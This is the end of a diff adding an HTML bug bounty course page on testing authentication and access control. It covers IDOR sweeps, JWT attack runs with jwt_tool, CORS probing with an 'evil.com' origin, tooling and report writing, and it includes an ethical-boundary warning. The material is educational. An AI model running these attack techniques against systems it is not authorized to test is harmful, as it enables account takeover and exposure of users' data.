+                </div>
+            </div>
+
+            <div class="callout callout-danger">
+                <span class="callout-icon">&#9888;</span>
+                <div>
+                    <div class="callout-title">Ethical Boundary</div>
+                    <div class="callout-text">Account takeover testing must be performed exclusively against
+                    accounts you control. Never attempt to access, modify, or compromise another real user's
+                    account. Create two test accounts and demonstrate the vulnerability using only your own
+                    accounts. Programs will disqualify and ban researchers who access real user data.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== SECTION 08: Testing Methodology for Auth ==================== -->
+    <div class="section" id="s8">
+        <div class="section-number">Section 08</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128203;</span>
+            Testing Methodology for Auth
+        </h2>
+        <div class="section-body">
+            <p>
+                Systematic testing separates productive researchers from those who find one bug per
+                month by accident. Authentication and authorization testing requires multiple accounts,
+                methodical endpoint coverage, and tooling that automates the repetitive comparison work.
+                This section provides the operational checklist, introduces the key tools, and covers
+                how to report access control vulnerabilities with maximum impact.
+            </p>
+
+            <h3>Systematic Auth Testing Checklist</h3>
+
+            <ul class="numbered-list">
+                <li><strong>Account setup.</strong> Create at least three accounts: a regular user (Account A), a second regular user (Account B), and an admin or higher-privileged user (Account C) if possible. Log each into a separate browser profile.</li>
+                <li><strong>Endpoint mapping.</strong> Crawl the application with each account level. Review JavaScript source files for API paths. Check for Swagger/OpenAPI docs at <code>/api-docs</code>, <code>/swagger.json</code>, <code>/openapi.json</code>. Build a matrix of all endpoints.</li>
+                <li><strong>Authorization matrix.</strong> For every endpoint, record the expected authorization behavior (which roles should have access) and the actual behavior when accessed with each account's session. Flag any discrepancies.</li>
+                <li><strong>IDOR sweep.</strong> For every endpoint that accepts an identifier, replay the request from Account B using Account A's identifier. Test with Account C's identifiers from Account A's session for vertical escalation.</li>
+                <li><strong>Method variation.</strong> For every endpoint tested, also test with alternate HTTP methods (GET, POST, PUT, PATCH, DELETE, OPTIONS). Some endpoints enforce auth on one method but not others.</li>
+                <li><strong>Session validation.</strong> Test session regeneration on login, session invalidation on logout, session invalidation on password change, cookie flags, session timeout, and concurrent session behavior.</li>
+                <li><strong>Token analysis.</strong> If the application uses JWTs, test for none algorithm, algorithm confusion, claim manipulation, and expiration enforcement. If it uses opaque session tokens, run Burp Sequencer to test randomness.</li>
+                <li><strong>OAuth review.</strong> If the application supports OAuth login, test redirect_uri validation, state parameter presence and unpredictability, scope enforcement, and token storage practices.</li>
+                <li><strong>Password reset flow.</strong> Test token predictability, host header injection, rate limiting on verification codes, token expiration, and single-use enforcement.</li>
+                <li><strong>CORS check.</strong> Send requests with <code>Origin: https://evil.com</code> and <code>Origin: null</code> to every authenticated endpoint. Check for reflected origins with <code>Access-Control-Allow-Credentials: true</code>.</li>
+            </ul>
+
+            <h3>Tools</h3>
+
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <div class="tool-name">Autorize</div>
+                    <div class="tool-role">Burp Extension &mdash; Automatic Auth Testing</div>
+                    <div class="tool-desc">Autorize is a Burp extension that automatically replays every
+                    request with a different user's session cookies. Configure it with Account B's cookies
+                    and browse the application as Account A. Autorize shows, for each request, whether
+                    Account B received the same response (authorization bypass) or a 401/403 (enforced).
+                    It color-codes results for quick triage: green for enforced, red for bypassed.</div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">AuthMatrix</div>
+                    <div class="tool-role">Burp Extension &mdash; Access Matrix</div>
+                    <div class="tool-desc">AuthMatrix allows you to define multiple users and roles, then
+                    build an access control matrix for selected requests. You mark which user-role
+                    combinations should succeed or fail for each endpoint, then run the test. AuthMatrix
+                    replays every request with every user's session and highlights violations against
+                    your expected matrix. Best for applications with complex role hierarchies.</div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">jwt_tool</div>
+                    <div class="tool-role">CLI &mdash; JWT Attack Suite</div>
+                    <div class="tool-desc">Comprehensive JWT testing tool. Use <code>-M at</code> to run
+                    all known attack techniques automatically against a target. Supports none algorithm,
+                    key confusion, JWK/JWKS injection, kid injection, claim tampering, and HMAC brute-force.
+                    Essential for any application that uses JWT-based authentication.</div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">Burp Sequencer</div>
+                    <div class="tool-role">Burp Suite &mdash; Token Analysis</div>
+                    <div class="tool-desc">Analyzes the randomness quality of session tokens, CSRF tokens,
+                    and any other generated values. Feed it the token-generating request and it collects
+                    thousands of samples, running statistical tests (FIPS, chi-squared, bit-level analysis)
+                    to detect patterns or insufficient entropy.</div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">ffuf / feroxbuster</div>
+                    <div class="tool-role">CLI &mdash; Content Discovery</div>
+                    <div class="tool-desc">Fast web fuzzers for discovering hidden endpoints, admin panels,
+                    and API paths that are not linked in the application UI. Use with auth-focused wordlists
+                    from SecLists. Run with an authenticated session cookie to discover endpoints that
+                    return different responses for authenticated vs. unauthenticated users.</div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">Burp Match/Replace</div>
+                    <div class="tool-role">Burp Suite &mdash; Header Injection</div>
+                    <div class="tool-desc">Use Burp's match/replace rules to automatically add Origin
+                    headers for CORS testing, modify Host headers for host header injection tests, or
+                    swap session cookies between users. Automates repetitive header manipulation across
+                    all proxied traffic.</div>
+                </div>
+            </div>
+
+            <h3>Automating Auth Testing</h3>
+            <p>
+                Manual testing catches the nuanced bugs, but automation catches the obvious ones at
+                scale. The workflow combines automated tools with manual review:
+            </p>
+            <ul>
+                <li>Enable Autorize with Account B's cookies and browse the entire application as Account A. Review the Autorize log for any green (bypassed) endpoints.</li>
+                <li>Run a content discovery scan with an authenticated session to find hidden endpoints. Test each discovered endpoint with Autorize.</li>
+                <li>Export the list of all unique endpoints from Burp's sitemap. Write a script that replays each request with unauthenticated, regular user, and admin sessions, comparing response codes and body lengths.</li>
+                <li>For JWT-based applications, run <code>jwt_tool -M at</code> against the target to automatically test all known JWT attack variants.</li>
+                <li>For CORS, use a Burp match/replace rule to add the Origin header and passively monitor for reflected origins during normal testing.</li>
+            </ul>
+
+            <h3>Reporting Access Control Vulnerabilities with Impact</h3>
+            <p>
+                Access control reports must demonstrate clear impact to receive appropriate severity
+                ratings and payouts. The structure of an effective report follows a consistent pattern:
+            </p>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3>&#9989; Strong Report</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9654;</span> Clear title: "IDOR in /api/invoices allows any user to access all invoices"</li>
+                        <li><span class="li-marker">&#9654;</span> Step-by-step reproduction with exact requests and responses</li>
+                        <li><span class="li-marker">&#9654;</span> Two-account proof showing Account B accessing Account A's data</li>
+                        <li><span class="li-marker">&#9654;</span> Sensitive data visible in the response body (redact PII in screenshots)</li>
+                        <li><span class="li-marker">&#9654;</span> Impact statement: "All 50,000+ users' invoices containing PII are accessible"</li>
+                        <li><span class="li-marker">&#9654;</span> Remediation: "Verify requesting user owns the invoice before returning data"</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3>&#10060; Weak Report</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9654;</span> Vague title: "Access control issue found"</li>
+                        <li><span class="li-marker">&#9654;</span> Missing exact request/response evidence</li>
+                        <li><span class="li-marker">&#9654;</span> Single-account test without proving cross-user access</li>
+                        <li><span class="li-marker">&#9654;</span> No demonstration of sensitive data exposure</li>
+                        <li><span class="li-marker">&#9654;</span> No scale or population impact described</li>
+                        <li><span class="li-marker">&#9654;</span> No remediation guidance</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#9432;</span>
+                <div>
+                    <div class="callout-title">Maximize Your Payout</div>
+                    <div class="callout-text">Before submitting a single IDOR or access control bug, spend
+                    30 minutes exploring what you can chain. Can you escalate from data read to data write?
+                    From data write to account takeover? From one user's data to all users' data via
+                    enumeration? The chain determines the severity, and the severity determines the payout.
+                    A well-demonstrated chain with full ATO impact will pay 5&ndash;10x more than the
+                    individual components submitted separately.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== DISCUSSION ==================== -->
+    <div class="section" id="discussion">
+        <div class="discussion-section">
+            <div class="discussion-title">
+                <span>&#128172;</span> Discussion Prompts
+            </div>
+            <ul class="prompt-list">
+                <li class="prompt-item">
+                    <span class="prompt-num">01</span>
+                    You discover an IDOR that exposes non-sensitive data (display names and profile pictures) for all users. The program rates this as informational. How would you investigate whether this IDOR can be chained with other endpoints to escalate impact, and at what point does the chain justify a re-submission at higher severity?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">02</span>
+                    An application uses JWTs with RS256 but the public key is not exposed at any well-known endpoint. What techniques would you use to obtain or derive the public key, and how does this affect your ability to test for algorithm confusion attacks?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">03</span>
+                    You find a CORS misconfiguration that reflects arbitrary origins with credentials on an API endpoint. However, the endpoint only returns the authenticated user's own username and email. How do you frame the impact in your report to ensure it is not dismissed as low-severity, and what additional reconnaissance would you perform to find higher-impact endpoints with the same misconfiguration?
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- ==================== COMPLETION ==================== -->
+    <div class="section" id="completion">
+        <div class="completion-section">
+            <div class="completion-icon">&#10003;</div>
+            <h2 class="completion-title">Module Complete</h2>
+            <p class="completion-text">
+                You have covered IDOR exploitation across APIs and file downloads, OAuth 2.0 flow
+                analysis and redirect_uri attacks, JWT attack techniques including none algorithm and
+                key confusion, session management attack patterns, CORS misconfiguration discovery and
+                exploitation, privilege escalation chains, password reset and account takeover
+                methodologies, 2FA bypass techniques, and a systematic testing methodology with
+                purpose-built tooling for every layer of the authentication and authorization stack.
+            </p>
+            <button class="completion-btn" onclick="completeModule()">
+                <span>&#10003;</span>
+                Complete Module 07
+            </button>
+        </div>
+    </div>
+
+</main>
+
+<script>
+    // Scroll progress bar — updates both the fixed top bar and the mini bar in the header
+    function updateScrollProgress() {
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+        const pct = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+        document.getElementById('scrollProgress').style.width = pct + '%';
+        document.getElementById('readingFill').style.width = pct + '%';
+    }
+
+    window.addEventListener('scroll', updateScrollProgress, { passive: true });
+
+    // Section fade-in via IntersectionObserver — adds 'visible' class when section enters viewport
+    function initSectionAnimations() {
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) entry.target.classList.add('visible');
+            });
+        }, { threshold: 0.08 });
+
+        document.querySelectorAll('.section').forEach(s => observer.observe(s));
+    }
+
+    // Expandable detail sections — toggle open/close state
+    function toggleDetail(header) {
+        const body = header.nextElementSibling;
+        const toggle = header.querySelector('.detail-toggle');
+        const isOpen = body.classList.contains('open');
+        body.classList.toggle('open', !isOpen);
+        toggle.classList.toggle('open', !isOpen);
+    }
+
+    // Module completion — delegates to ModuleProgress component
+    function completeModule() {
+        if (typeof ModuleProgress !== 'undefined') {
+            ModuleProgress.complete('dark-arts', 'bh-mod-auth-access', {
+                returnUrl: '../index.html'
+            });
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        initSectionAnimations();
+    });
+</script>
+
+</body>
+</html>
